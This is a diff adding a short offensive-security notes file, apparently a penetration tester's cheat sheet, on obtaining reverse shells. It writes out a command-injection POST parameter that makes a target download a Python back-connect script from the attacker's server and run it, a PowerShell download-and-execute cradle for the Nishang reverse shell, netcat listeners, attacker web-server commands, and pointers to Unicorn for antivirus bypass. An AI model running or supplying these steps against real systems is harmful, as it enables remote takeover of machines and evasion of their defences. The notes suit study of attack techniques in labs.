@@ -1,0 +1,33 @@
+Unicorn (anti-virus bypass on reverse shell):
+
+- use necessary command from help section
+- run metasploit commands
+- run script commands
+
+http body request code execution reverse shell:
+
+- Download python pty shells from https://github.com/infodox/python-pty-shells 
+- run "python -m SimpleHttpServer" in same directory
+- send POST request with parameter "x=wget <ip>:<port>/tcp_pty_backconnect.py -0 /dev/shm/.rev.py"
+- check if successful with "cat /dev/shm/.rev.py"
+- run "python tcp pty_shell_handler.py -b <ip>:<port>" to listen for reverse shell connection
+- send request with paramter "x=python /dev/shm/.rev.py"
+
+Nishang (PowerShell reverse shell on Windows machine):
+
+- get Nishang from https://github.com/samratashok/nishang
+- copy Invoke-PowershellTcp.ps1 to a separate directory
+- copy the reverse shell example and paste it with filled contents at bottom of file
+- run "nc -lvnp <port>" to listen for reverse shell
+- run "python -m SimpleHttpServer" in same directory as PS script to serve for target server
+- start PS on Win box with "c:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://<ip>:<port>/Invoke-PowerShellTcp.ps1')" (this likely needs to be URL encoded)
+
+Python attacker web server setup:
+"python -m SimpleHTTPServer <port_num>" (if python2)
+"python3 -m http.server <port_num>" (if python3)
+
+EVEN FASTER REVERSE SHELL:
+https://shell.now.sh/
+
+Reverse shell payloads for different target environments:
+http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
